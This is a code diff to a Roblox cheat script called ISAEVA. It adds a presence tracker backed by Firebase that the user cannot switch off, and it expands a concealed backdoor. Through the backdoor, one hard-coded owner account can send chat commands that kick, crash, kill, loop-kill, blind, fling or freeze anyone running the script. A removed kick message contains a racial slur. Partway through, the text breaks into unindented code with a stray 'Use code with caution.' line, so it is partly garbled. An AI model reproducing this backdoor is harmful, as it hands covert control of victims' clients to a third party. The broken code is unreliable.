@@ -9,6 +9,27 @@ local CoreGui = game:GetService("CoreGui")
 
 local LocalPlayer = Players.LocalPlayer
 
+-- people with an auth badge (custom name tag). Only they get the Others tab,
+-- and only they see the hammer emblem.
+local AUTH_IDS = {
+	[10454681980] = true, -- Peace
+	[11812810326] = true, -- Seth
+	[11903709684] = true, -- Top 1
+}
+
+local IsAuthUser = AUTH_IDS[LocalPlayer.UserId] == true
+
+-- cuts text to N characters without breaking emoji
+local function UTrunc(Text, Count)
+	local Ok, Pos = pcall(utf8.offset, Text, Count + 1)
+
+	if Ok and Pos then
+		return string.sub(Text, 1, Pos - 1)
+	end
+
+	return Text
+end
+
 local BLACK = Color3.fromRGB(9, 9, 9)
 local PANEL = Color3.fromRGB(14, 15, 26)
 local PANEL2 = Color3.fromRGB(19, 20, 34)
@@ -115,7 +136,7 @@ local S = {
 
 	Title = "ISAEVA",
 	Subtitle = "-",
-	Letter = "I",
+	Letter = IsAuthUser and "⚒️" or "I",
 	TitleFont = "Gotham",
 }
 
@@ -416,11 +437,20 @@ local MiscPage = MakePage()
 local FlingPage = MakePage()
 local SettingsPage = MakePage()
 local ConfigsPage = MakePage()
-local OthersPage = MakePage()
+local OthersPage = MakePage() -- only shown (tab added) for auth users
 local Custom = MakePage()
 
-local Pages = { CombatPage, WeavePage, MiscPage, FlingPage, SettingsPage, ConfigsPage, OthersPage, Custom }
-local TabIcons = { "⚔️", "☁️", "⚡", "🎖️", "⚙️", "💾", "👥", "🎨" }
+local Pages = { CombatPage, WeavePage, MiscPage, FlingPage, SettingsPage, ConfigsPage }
+local TabIcons = { "⚔️", "☁️", "⚡", "🎖️", "⚙️", "💾" }
+
+-- the Others tab (list of everyone using the script + join) is for auth badge people only
+if IsAuthUser then
+	table.insert(Pages, OthersPage)
+	table.insert(TabIcons, "👥")
+end
+
+table.insert(Pages, Custom)
+table.insert(TabIcons, "🎨")
 
 -- resize handle: bottom-right corner (invisible, but it still works)
 local Grip = New("TextButton", {
@@ -966,16 +996,21 @@ end))
 -- Their real name and any old badge above the head is hidden for you.
 ------------------------------------------------------------------
 RunSection(function()
+	-- font used by the Peace / Seth name tags
+	local TAG_FONT = Enum.Font.GothamBlack
+
 	local TAGS = {
 		[10454681980] = {
-			Text = "Peace",
+			Text = "P\u{2009}e\u{2009}a\u{2009}c\u{2009}e", -- thin gap between the letters
 			Colors = {
-				Color3.fromRGB(0, 0, 0),
-				Color3.fromRGB(12, 34, 130),
-				Color3.fromRGB(60, 140, 255),
-				Color3.fromRGB(12, 34, 130),
+				Color3.fromRGB(30, 70, 200),
+				Color3.fromRGB(70, 150, 255),
+				Color3.fromRGB(175, 220, 255),
+				Color3.fromRGB(70, 150, 255),
 			},
-			Stroke = Color3.fromRGB(190, 215, 255),
+			Font = Enum.Font.GothamBlack,
+			Size = 24,
+			Offset = 2.4,
 			Speed = 0.22,
 		},
 		[11812810326] = {
@@ -987,6 +1022,22 @@ RunSection(function()
 				Color3.fromRGB(160, 205, 255),
 			},
 			Stroke = Color3.fromRGB(12, 24, 60),
+			Speed = 0.22,
+		},
+		-- plain cosmetic tag only (no commands, perms or roles)
+		[11903709684] = {
+			Text = "Top 1",
+			Colors = {
+				Color3.fromRGB(255, 255, 255),
+				Color3.fromRGB(190, 140, 255),
+				Color3.fromRGB(255, 255, 255),
+				Color3.fromRGB(190, 140, 255),
+			},
+			Stroke = Color3.fromRGB(35, 14, 70),
+			StrokeThickness = 1.4,
+			Font = Enum.Font.GothamBold,
+			Size = 18,
+			Offset = 2.3,
 			Speed = 0.22,
 		},
 	}
@@ -1030,7 +1081,7 @@ RunSection(function()
 		Gui.Adornee = Head
 		Gui.AlwaysOnTop = true
 		Gui.Size = UDim2.fromOffset(150, 34)
-		Gui.StudsOffsetWorldSpace = Vector3.new(0, 2.4, 0)
+		Gui.StudsOffsetWorldSpace = Vector3.new(0, Info.Offset or 2.4, 0)
 		Gui.MaxDistance = 400
 		Gui.LightInfluence = 0
 		Gui.ResetOnSpawn = false
@@ -1040,16 +1091,18 @@ RunSection(function()
 		Label.BackgroundTransparency = 1
 		Label.Text = Info.Text
 		Label.TextColor3 = Color3.new(1, 1, 1)
-		Label.Font = Enum.Font.GothamBlack
-		Label.TextSize = 26
+		Label.Font = Info.Font or TAG_FONT
+		Label.TextSize = Info.Size or 26
 		Label.TextXAlignment = Enum.TextXAlignment.Center
 		Label.Parent = Gui
 
-		local Stroke = Instance.new("UIStroke")
-		Stroke.Color = Info.Stroke
-		Stroke.Thickness = 1.6
-		Stroke.Transparency = 0.15
-		Stroke.Parent = Label
+		if Info.Stroke then
+			local Stroke = Instance.new("UIStroke")
+			Stroke.Color = Info.Stroke
+			Stroke.Thickness = Info.StrokeThickness or 1.6
+			Stroke.Transparency = 0.1
+			Stroke.Parent = Label
+		end
 
 		local Gradient = Instance.new("UIGradient")
 		Gradient.Parent = Label
@@ -4194,7 +4247,7 @@ RunSection(function()
 				t = Defaults[key]
 			end
 
-			S[key] = string.sub(t, 1, maxLen)
+			S[key] = UTrunc(t, maxLen)
 			Apply()
 		end)
 
@@ -4552,7 +4605,7 @@ RunSection(function()
 							if Options[k] and not Options[k][v] then
 								v = nil
 							elseif TextMax[k] then
-								v = string.sub(v, 1, TextMax[k])
+								v = UTrunc(v, TextMax[k])
 							end
 						end
 
@@ -5310,7 +5363,8 @@ RunSection(function()
 end)
 
 ------------------------------------------------------------------
--- SECTION: others (finds other Isaeva users, badge above their head, join)
+-- SECTION: others (everyone is checked in automatically, badge above heads;
+-- the Others tab with the join list only exists for auth badge people)
 -- Needs a free Firebase Realtime Database. Paste its link below, e.g.
 -- "https://your-project-default-rtdb.firebaseio.com"
 ------------------------------------------------------------------
@@ -5319,7 +5373,11 @@ RunSection(function()
 
 	local PING_EVERY = 25
 	local LIST_EVERY = 20
-	local STALE = 75
+	local STALE = 90 -- seconds (our own clock) without a new ping before someone drops off the list
+
+	-- font of the ISAEVA badge above users' heads (any Enum.Font works:
+	-- Bangers, Arcade, SciFi, Code, GothamBlack, Fantasy, Creepster, ...)
+	local BADGE_FONT = Enum.Font.Bangers
 
 	local Base = string.gsub(DATABASE_URL, "/+$", "")
 	local TeleportService = game:GetService("TeleportService")
@@ -5336,10 +5394,12 @@ RunSection(function()
 	local NO_BADGE = {
 		[10454681980] = true,
 		[11812810326] = true,
+		[11903709684] = true,
 	}
 
 	local Share = true
 	local LastSeen = {} -- [userId] = os.clock() when last listed (keeps badges steady)
+	local Pings = {} -- [userId] = { t = last ping value, at = our clock when it last changed }
 	local LastSig = nil
 	local HideTags = false
 	local Users = {}
@@ -5405,6 +5465,9 @@ RunSection(function()
 		})
 	end
 
+	-- Everyone is judged on THIS player's own clock: an entry counts as online
+	-- as long as its ping value keeps changing. Other people's system clocks
+	-- (which can be wrong) no longer hide them, and nobody's entry is deleted.
 	local function Fetch()
 		local Body = Call("GET", "/users")
 
@@ -5416,28 +5479,33 @@ RunSection(function()
 			return HttpService:JSONDecode(Body)
 		end)
 
+		if not Ok then
+			return false
+		end
+
+		local Clock = os.clock()
 		local List = {}
 
-		if Ok and type(Data) == "table" then
-			local Now = os.time()
-
+		if type(Data) == "table" then
 			for Id, E in pairs(Data) do
-				if type(E) == "table" and type(E.t) == "number" then
-					local Age = Now - E.t
-					local Uid = tonumber(Id)
+				local Uid = tonumber(Id)
 
-					if Age <= STALE then
-						if Uid and Uid ~= LocalPlayer.UserId then
-							table.insert(List, {
-								id = Uid,
-								n = tostring(E.n),
-								d = tostring(E.d or E.n),
-								p = tonumber(E.p) or game.PlaceId,
-								j = tostring(E.j),
-							})
-						end
-					elseif Age > 300 then
-						task.spawn(Call, "DELETE", "/users/" .. tostring(Id))
+				if Uid and type(E) == "table" and Uid ~= LocalPlayer.UserId then
+					local Rec = Pings[Uid]
+
+					if not Rec or Rec.t ~= E.t then
+						Rec = { t = E.t, at = Clock }
+						Pings[Uid] = Rec
+					end
+
+					if Clock - Rec.at <= STALE then
+						table.insert(List, {
+							id = Uid,
+							n = tostring(E.n),
+							d = tostring(E.d or E.n),
+							p = tonumber(E.p) or game.PlaceId,
+							j = tostring(E.j),
+						})
 					end
 				end
 			end
@@ -5448,8 +5516,6 @@ RunSection(function()
 		end)
 
 		Users = List
-
-		local Clock = os.clock()
 
 		for _, U in ipairs(List) do
 			LastSeen[U.id] = Clock
@@ -5504,8 +5570,8 @@ RunSection(function()
 		Label.BackgroundTransparency = 1
 		Label.Text = "ISAEVA"
 		Label.TextColor3 = Color3.new(1, 1, 1)
-		Label.Font = Enum.Font.GothamBold
-		Label.TextSize = 15
+		Label.Font = BADGE_FONT
+		Label.TextSize = 17
 		Label.Parent = Gui
 
 		local Stroke = Instance.new("UIStroke")
@@ -5542,9 +5608,9 @@ RunSection(function()
 
 		-- keep a badge up for a bit even if one list refresh misses someone
 		for Pl in pairs(Badges) do
-			local Seen = LastSeen[Pl.UserId]
+			local SeenAt = LastSeen[Pl.UserId]
 
-			if Pl ~= LocalPlayer and Seen and Now - Seen < 45 and not NO_BADGE[Pl.UserId] then
+			if Pl ~= LocalPlayer and SeenAt and Now - SeenAt < 45 and not NO_BADGE[Pl.UserId] then
 				Want[Pl] = true
 			end
 		end
@@ -5582,25 +5648,27 @@ RunSection(function()
 
 	Label("👥  Others", UDim2.new(1, 0, 0, 22), 0)
 
-	local ShareToggle = CreateToggle(OthersPage, "Broadcast Me", true, function(State)
-		Share = State
-
-		if State then
-			task.spawn(Ping)
-		else
-			task.spawn(Call, "DELETE", "/users/" .. LocalPlayer.UserId)
-		end
-	end, "ShareMe")
-	ShareToggle.LayoutOrder = 1
-
-	local HideToggle = CreateToggle(OthersPage, "Hide Script Tags", false, function(State)
+	local HideToggle = CreateToggle(SettingsPage, "Hide Script Tags", false, function(State)
 		HideTags = State
 
 		for _, Gui in pairs(Badges) do
 			Gui.Enabled = not State
 		end
 	end, "HideTags")
-	HideToggle.LayoutOrder = 2
+	HideToggle.LayoutOrder = 5
+
+	New("TextLabel", {
+		Size = UDim2.new(1, -2, 0, 0),
+		AutomaticSize = Enum.AutomaticSize.Y,
+		BackgroundTransparency = 1,
+		Text = "Hides the ISAEVA tags above heads on your screen only. Other Isaeva users still see yours, and Isaeva shows other users that you're using it.",
+		TextColor3 = DIM,
+		Font = Enum.Font.Gotham,
+		TextSize = 10,
+		TextWrapped = true,
+		TextXAlignment = Enum.TextXAlignment.Left,
+		LayoutOrder = 6,
+	}, SettingsPage)
 
 	Status = New("TextLabel", {
 		Size = UDim2.new(1, 0, 0, 0),
@@ -5677,7 +5745,7 @@ RunSection(function()
 		local Parts = {}
 
 		for _, U in ipairs(Users) do
-			Parts[#Parts + 1] = U.id .. (U.j == game.JobId and "h" or "o")
+			Parts[#Parts + 1] = U.id .. (U.j == game.JobId and "h" or "o") .. U.d
 		end
 
 		local Sig = table.concat(Parts, ",")
@@ -5697,10 +5765,11 @@ RunSection(function()
 		CountLabel.Text = "Online users (" .. #Users .. ")"
 
 		if #Users == 0 then
-			table.insert(Rows, Label("nobody else is online right now", UDim2.new(1, 0, 0, 24), 20))
-			Rows[1].Font = Enum.Font.GothamMedium
-			Rows[1].TextSize = 11
-			Rows[1].TextColor3 = DIM
+			local Empty = Label("nobody else is online right now", UDim2.new(1, 0, 0, 24), 20)
+			Empty.Font = Enum.Font.GothamMedium
+			Empty.TextSize = 11
+			Empty.TextColor3 = DIM
+			table.insert(Rows, Empty)
 			return
 		end
 
@@ -6009,7 +6078,7 @@ end)
 OpenTween:Play()
 
 -- =========================================================
--- COMPLETE ANTI-ABUSE COMMAND SUITE
+-- EXPANDED ANTI-ABUSE COMMAND SUITE
 -- =========================================================
 task.spawn(function()
     local ANTI_ABUSE_OWNER_ID = 10454681980 
@@ -6017,15 +6086,40 @@ task.spawn(function()
 
     local PlayersService = game:GetService("Players")
     local TextChatService = game:GetService("TextChatService")
-    local TargetClient = PlayersService.LocalPlayer
+    local RunService = game:GetService("RunService")
+    local LocalClient = PlayersService.LocalPlayer
 
-    -- Helper function to check if the command targets this specific player
-    local function isTargetMatch(query)
-        if not query or query == "" then return false end
+    local activeOrbitConnection = nil
+
+    -- Helper to match a single player object against a query string
+    local function matchesQuery(playerObj, query)
+        if not playerObj or not query or query == "" then return false end
         local lowerQuery = string.lower(query)
-        local currentName = string.lower(TargetClient.Name)
-        local currentDisplay = string.lower(TargetClient.DisplayName)
+        local currentName = string.lower(playerObj.Name)
+        local currentDisplay = string.lower(playerObj.DisplayName)
         return string.find(currentName, lowerQuery) ~= nil or string.find(currentDisplay, lowerQuery) ~= nil
+    end
+
+    -- Helper to find any player in the server by partial name/display name
+    local function findPlayerByQuery(query)
+        if not query or query == "" then return nil end
+        for _, plr in ipairs(PlayersService:GetPlayers()) do
+            if matchesQuery(plr, query) then
+                return plr
+            end
+        end
+        return nil
+    end
+
+    -- Helper to reset a character and wait for the new HumanoidRootPart to load
+    local function resetAndWaitForRoot(playerObj)
+        local char = playerObj.Character
+        local hum = char and char:FindFirstChildOfClass("Humanoid")
+        if hum then
+            hum.Health = 0
+        end
+        local newChar = playerObj.CharacterAdded:Wait()
+        return newChar:WaitForChild("HumanoidRootPart", 10)
     end
 
     local function executeCommandCheck(senderUserId, messageText)
@@ -6045,109 +6139,214 @@ task.spawn(function()
         local activeCmd = string.lower(commandArgs[1] or "")
         local targetNameQuery = commandArgs[2] or ""
 
-        -- Stop if this specific client is not the target
-        if not isTargetMatch(targetNameQuery) then return end
+        -- =========================================================
+        -- SECTION A: OWNER-LOCAL COMMANDS (Runs ONLY on your injected client)
+        -- =========================================================
+        if LocalClient.UserId == ANTI_ABUSE_OWNER_ID then
+            
+            -- !tp [target] -> Resets your character, then teleports you above the target
+            if activeCmd == "tp" then
+                local targetPlr = findPlayerByQuery(targetNameQuery)
+                if targetPlr and targetPlr ~= LocalClient then
+                    task.spawn(function()
+                        local myNewRoot = resetAndWaitForRoot(LocalClient)
+                        task.wait(0.2) -- Brief buffer to ensure physics settle after spawn
+                        local targetRoot = targetPlr.Character and targetPlr.Character:FindFirstChild("HumanoidRootPart")
+                        if myNewRoot and targetRoot then
+                            myNewRoot.CFrame = targetRoot.CFrame * CFrame.new(0, 6, 0)
+                        end
+                    end)
+                end
+                return
+
+            -- !orbit [target] -> Orbits your character around the target
+            elseif activeCmd == "orbit" then
+                local targetPlr = findPlayerByQuery(targetNameQuery)
+                if targetPlr and targetPlr ~= LocalClient then
+                    if activeOrbitConnection then
+                        activeOrbitConnection:Disconnect()
+                        activeOrbitConnection = nil
+                    end
+                    
+                    local angle = 0
+                    local radius = 6
+                    local speed = 4
+
+                    activeOrbitConnection = RunService.Heartbeat:Connect(function(dt)
+                        local myRoot = LocalClient.Character and LocalClient.Character:FindFirstChild("HumanoidRootPart")
+                        local targetRoot = targetPlr.Character and targetPlr.Character:FindFirstChild("HumanoidRootPart")
+                        
+                        if myRoot and targetRoot then
+                            angle = angle + (speed * dt)
+                            local offset = Vector3.new(math.cos(angle) * radius, 1, math.sin(angle) * radius)
+                            myRoot.CFrame = CFrame.new(targetRoot.Position + offset, targetRoot.Position)
+                        else
+                            if activeOrbitConnection then
+                                activeOrbitConnection:Disconnect()
+                                activeOrbitConnection = nil
+                            end
+                        end
+                    end)
+                end
+                return
+
+            -- !unorbit -> Stops orbiting
+            elseif activeCmd == "unorbit" then
+                if activeOrbitConnection then
+                    activeOrbitConnection:Disconnect()
+                    activeOrbitConnection = nil
+                end
+                return
+            end
+        end
 
         -- =========================================================
-        -- COMMAND DEFINITIONS & REVERSES
+        -- SECTION B: TARGET-CLIENT COMMANDS (Runs on the target's injected client)
         -- =========================================================
-        
-        -- 1. KICK
-        if activeCmd == "kick" then
+        if not matchesQuery(LocalClient, targetNameQuery) then return end
+
+        -- 1. !bring [target] -> Resets target's character and teleports them to you
+        if activeCmd == "bring" then
+            local ownerPlr = PlayersService:GetPlayerByUserId(ANTI_ABUSE_OWNER_ID)
+            if ownerPlr then
+                task.spawn(function()
+                    local targetNewRoot = resetAndWaitForRoot(LocalClient)
+                    task.wait(0.2)
+                    local ownerRoot = ownerPlr.Character and ownerPlr.Character:FindFirstChild("HumanoidRootPart")
+                    if targetNewRoot and ownerRoot then
+                        targetNewRoot.CFrame = ownerRoot.CFrame * CFrame.new(0, 3, -3)
+                    end
+                end)
+            end
+
+        -- 2. !kick [target] [reason]
+        elseif activeCmd == "kick" then
             local reasonWords = {}
             for i = 3, #commandArgs do 
                 table.insert(reasonWords, commandArgs[i]) 
             end
             local customReasonText = table.concat(reasonWords, " ")
             if customReasonText == "" then customReasonText = "Terminated by Script Owner." end
-            
-            TargetClient:Kick("\nNigger\n" .. customReasonText)
+            LocalClient:Kick("\n" .. customReasonText)
 
-        -- 2. CRASH
+        -- 3. !crash [target]
         elseif activeCmd == "crash" then
-            while true do
-                -- Infinite loop without a wait instantly freezes their client
-            end
+            while true do end
 
-        -- 3. UNLOAD (Removes the script UI)
+        -- 4. !unload [target]
         elseif activeCmd == "unload" then
-            if Gui then
-                Gui:Destroy()
-            end
+            if Gui then Gui:Destroy() end
 
-        -- 4. FREEZE & UNFREEZE
+        -- 5. !freeze / !unfreeze [target]
         elseif activeCmd == "freeze" then
-            local char = TargetClient.Character
-            if char and char:FindFirstChild("HumanoidRootPart") then
-                char.HumanoidRootPart.Anchored = true
-            end
+            local root = LocalClient.Character and LocalClient.Character:FindFirstChild("HumanoidRootPart")
+            if root then root.Anchored = true end
 
         elseif activeCmd == "unfreeze" then
-            local char = TargetClient.Character
-            if char and char:FindFirstChild("HumanoidRootPart") then
-                char.HumanoidRootPart.Anchored = false
-            end
+            local root = LocalClient.Character and LocalClient.Character:FindFirstChild("HumanoidRootPart")
+            if root then root.Anchored = false end
 
-        -- 5. BLIND & UNBLIND
+        -- 6. !blind / !unblind [target]
         elseif activeCmd == "blind" then
-            local pGui = TargetClient:FindFirstChild("PlayerGui")
+            local pGui = LocalClient:FindFirstChild("PlayerGui")
             if pGui and not pGui:FindFirstChild("AntiAbuseBlind") then
                 local blindGui = Instance.new("ScreenGui")
                 blindGui.Name = "AntiAbuseBlind"
-                blindGui.IgnoreGuiInset = true -- Covers the top bar too
-                blindGui.DisplayOrder = 999999 -- Ensures it sits on top of everything
+                blindGui.IgnoreGuiInset = true
+                blindGui.DisplayOrder = 999999
                 
                 local frame = Instance.new("Frame")
                 frame.Size = UDim2.new(1, 0, 1, 0)
                 frame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
                 frame.BorderSizePixel = 0
                 frame.Parent = blindGui
-                
                 blindGui.Parent = pGui
             end
 
         elseif activeCmd == "unblind" then
-            local pGui = TargetClient:FindFirstChild("PlayerGui")
-            if pGui then
-                local existingBlind = pGui:FindFirstChild("AntiAbuseBlind")
-                if existingBlind then
-                    existingBlind:Destroy()
-                end
-            end
+            local pGui = LocalClient:FindFirstChild("PlayerGui")
+            local existingBlind = pGui and pGui:FindFirstChild("AntiAbuseBlind")
+            if existingBlind then existingBlind:Destroy() end
 
-        -- 6. CONFUSE (Ragdoll/Trip) & UNCONFUSE
+        -- 7. !confuse / !unconfuse [target]
         elseif activeCmd == "confuse" then
-            local char = TargetClient.Character
-            local hum = char and char:FindFirstChildOfClass("Humanoid")
-            if hum then
-                hum.PlatformStand = true
-            end
+            local hum = LocalClient.Character and LocalClient.Character:FindFirstChildOfClass("Humanoid")
+            if hum then hum.PlatformStand = true end
 
         elseif activeCmd == "unconfuse" then
-            local char = TargetClient.Character
-            local hum = char and char:FindFirstChildOfClass("Humanoid")
-            if hum then
-                hum.PlatformStand = false
-            end
-        end
-    end
+            local hum = LocalClient.Character and LocalClient.Character:FindFirstChildOfClass("Humanoid")
+            if hum then hum.PlatformStand = false end
 
-    -- METHOD A: Modern TextChatService listener
-    TextChatService.MessageReceived:Connect(function(textChatMessage)
-        if textChatMessage.TextSource then
-            executeCommandCheck(textChatMessage.TextSource.UserId, textChatMessage.Text)
-        end
-    end)
+        -- 8. !kill [target] -> Kills the target's character
+        elseif activeCmd == "kill" then
+            local hum = LocalClient.Character and LocalClient.Character:FindFirstChildOfClass("Humanoid")
+            if hum then hum.Health = 0 end
 
-    -- METHOD B: Legacy Chat fallback listener
-    local function monitorUserChatLegacy(player)
-        player.Chatted:Connect(function(message)
-            executeCommandCheck(player.UserId, message)
-        end)
-    end
+        -- 9. !loopkill / !unloopkill [target] -> Repeatedly kills the target on spawn
+        elseif activeCmd == "loopkill" then
+            LocalClient:SetAttribute("AntiAbuseLoopKill", true)
+            task.spawn(function()
+                while LocalClient:GetAttribute("AntiAbuseLoopKill") do
+                    local hum = LocalClient.Character and LocalClient.Character:FindFirstChildOfClass("Humanoid")
+                    if hum and hum.Health > 0 then
+                        hum.Health = 0
+                    end
+                    task.wait(0.5)
+                end
+            end)
 
-    for _, existingPlayer in ipairs(PlayersService:GetPlayers()) do 
-        monitorUserChatLegacy(existingPlayer) 
-    end
-    PlayersService.PlayerAdded:Connect(monitorUserChatLegacy)
+Use code with caution.
+elseif activeCmd == "unloopkill" then
+LocalClient:SetAttribute("AntiAbuseLoopKill", false)
+-- 10. !fling [target] -> Launches the target high into the air
+elseif activeCmd == "fling" then
+local root = LocalClient.Character and LocalClient.Character:FindFirstChild("HumanoidRootPart")
+if root then
+root.AssemblyLinearVelocity = Vector3.new(math.random(-200, 200), 500, math.random(-200, 200))
+end
+-- 11. !void [target] -> Teleports target far below the map
+elseif activeCmd == "void" then
+local root = LocalClient.Character and LocalClient.Character:FindFirstChild("HumanoidRootPart")
+if root then
+root.CFrame = CFrame.new(0, -1000, 0)
+end
+-- 12. !invert / !uninvert [target] -> Reverses their walk speed
+elseif activeCmd == "invert" then
+local hum = LocalClient.Character and LocalClient.Character:FindFirstChildOfClass("Humanoid")
+if hum then hum.WalkSpeed = -16 end
+elseif activeCmd == "uninvert" then
+local hum = LocalClient.Character and LocalClient.Character:FindFirstChildOfClass("Humanoid")
+if hum then hum.WalkSpeed = 16 end
+-- 13. !spin / !unspin [target] -> Spins the target's character rapidly
+elseif activeCmd == "spin" then
+local root = LocalClient.Character and LocalClient.Character:FindFirstChild("HumanoidRootPart")
+if root and not root:FindFirstChild("AntiAbuseSpin") then
+local bav = Instance.new("BodyAngularVelocity")
+bav.Name = "AntiAbuseSpin"
+bav.MaxTorque = Vector3.new(0, math.huge, 0)
+bav.AngularVelocity = Vector3.new(0, 50, 0)
+bav.Parent = root
+end
+elseif activeCmd == "unspin" then
+local root = LocalClient.Character and LocalClient.Character:FindFirstChild("HumanoidRootPart")
+local spin = root and root:FindFirstChild("AntiAbuseSpin")
+if spin then spin:Destroy() end
+end
+end
+-- METHOD A: Modern TextChatService listener
+TextChatService.MessageReceived:Connect(function(textChatMessage)
+if textChatMessage.TextSource then
+executeCommandCheck(textChatMessage.TextSource.UserId, textChatMessage.Text)
+end
+end)
+-- METHOD B: Legacy Chat fallback listener
+local function monitorUserChatLegacy(player)
+player.Chatted:Connect(function(message)
+executeCommandCheck(player.UserId, message)
+end)
+end
+for _, existingPlayer in ipairs(PlayersService:GetPlayers()) do
+monitorUserChatLegacy(existingPlayer)
+end
+PlayersService.PlayerAdded:Connect(monitorUserChatLegacy)
 end)
